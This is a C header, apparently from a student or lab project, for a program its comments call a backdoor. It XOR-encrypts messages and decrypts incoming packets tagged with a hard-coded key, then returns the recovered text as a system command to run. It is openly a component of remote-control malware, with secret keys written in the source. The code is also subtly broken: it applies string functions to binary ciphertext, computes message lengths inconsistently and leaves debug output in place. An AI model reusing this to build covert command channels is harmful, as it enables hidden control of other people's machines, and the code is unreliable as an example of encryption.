/*
| ------------------------------------------------------------------------------
| File:     bd_encrypt.h
| Purpose:  Simple encryption and decryption for use with bd.c
| 
| ------------------------------------------------------------------------------
*/

#include "encrypt.h"

/*#define BD_KEY          "W1OExkq&"
#define BD_HEADER       "0bBH%iKU"
#define BD_FOOTER       "5@lbJKXK"*/

#define BD_KEY              "keyyyyyy"
#define BD_HEADER           "headerrr"
#define BD_FOOTER           "footerrr"
#define BD_ENCRYPT_KEY      "tQi8kvZ$~Mi+4qxKYXpBC2d_S2kmJBA["
#define BD_KEY_LEN          8
#define BD_MAX_MSG_LEN      1024
#define BD_MAX_REPLY_LEN    4096

/*
| ------------------------------------------------------------------------------
| Encryption
| 
| This function takes the following steps:
| - wrap a header and footer around the plaintext
| - encrypt the string
| - prepend a key to the hash
|
| Notes:
| - Pass hash_length to be filled with the encrypted message length
| ------------------------------------------------------------------------------
*/

char *bd_encrypt(char *plaintext, int *msg_length){
    printf("Encrypt plaintext: %s\n",plaintext);
    /* Declare variables */
    
    char hash[BD_MAX_MSG_LEN];
    memset(hash, 0, BD_MAX_MSG_LEN);
    
    /* Wrap in header and footer */
    
    strcpy(hash, BD_HEADER);
    if(strlen(plaintext) >= 1000){
        printf("Encryption failed.\n");
        return NULL;
    }
    strcat(hash, plaintext);
    strcat(hash, BD_FOOTER);
    printf("asdf\n");
    
    /* Encrypt */
    
    printf("hash len: %d",strlen(hash));
    xor_encrypt(hash, BD_ENCRYPT_KEY, strlen(hash));
    
    /* Prepend header key */
    
    char *msg = malloc(BD_MAX_MSG_LEN);
    memset(msg, 0, BD_MAX_MSG_LEN);
    strcpy(msg, BD_KEY);
    strncat(msg, hash, strlen(plaintext));
    
    printf("Message: %s\n", msg);
    
    /* Save total message length */
    
    *msg_length = (3 * BD_KEY_LEN) + strlen(plaintext);
    
    return msg; // Free this pointer after use
}

/*
| ------------------------------------------------------------------------------
| Decryption
| 
| This function takes the following steps:
| - remove prepended key
| - decrypt the hash
| - remove header and footer
| 
| Notes:
| - We must pass in the length of the payload because strlen doesnt suffice for
|   raw bit data.
| ------------------------------------------------------------------------------
*/

char *bd_decrypt(char *payload, int payload_len){
    printf("Decrypt payload: %s\n",payload);
    
    /* Check the packet for the key meant for the backdoor */
    
    if(strncmp(payload, BD_KEY, BD_KEY_LEN) != 0){
        printf("Not for backdoor, discard.\n");
        return NULL;
    }
    else
        printf("Got message!\n");
    
    /* Copy only encrypted portion of the payload to message */
    
    int message_len = payload_len - BD_KEY_LEN;
    char message[BD_MAX_REPLY_LEN];
    memset(message, 0, BD_MAX_REPLY_LEN);
    strncpy(message, payload + BD_KEY_LEN, message_len);
    printf("Message: %s\n", message);
    
    /* Decrypt message */
    
    printf("message len: %d\n",strlen(message));
    printf("message actual len: %d\n", message_len);
    xor_encrypt(message, BD_ENCRYPT_KEY, message_len);
    
    /* Verify decryption succeeds by checking for header and footer */
    
    char *bd_header = message;
    char *bd_footer = message + (strlen(message) - BD_KEY_LEN);
    
    if(strncmp(bd_header, BD_HEADER, BD_KEY_LEN) != 0 || \
        strncmp(bd_footer, BD_FOOTER, BD_KEY_LEN) != 0 ){
        printf("Decryption failed, discard.\n");
        return NULL;
    }
    else
        printf("Decryption success: %s\n", message);
    
    /* All checks successful, run the system command */
    
    // Strip header and footer to get command
    char *bd_command = malloc(BD_MAX_REPLY_LEN);
    memset(bd_command, 0, BD_MAX_REPLY_LEN);
    strncpy(bd_command, \
        (message + BD_KEY_LEN), \
        strlen(message) - (2 * BD_KEY_LEN));
    if(strlen(bd_command) == 0){
        printf("Invalid command: %s\n", bd_command);
        return NULL;
    }
    else
        printf("Command: %s\n", bd_command);
    
    return bd_command; // Free this pointer after use
}
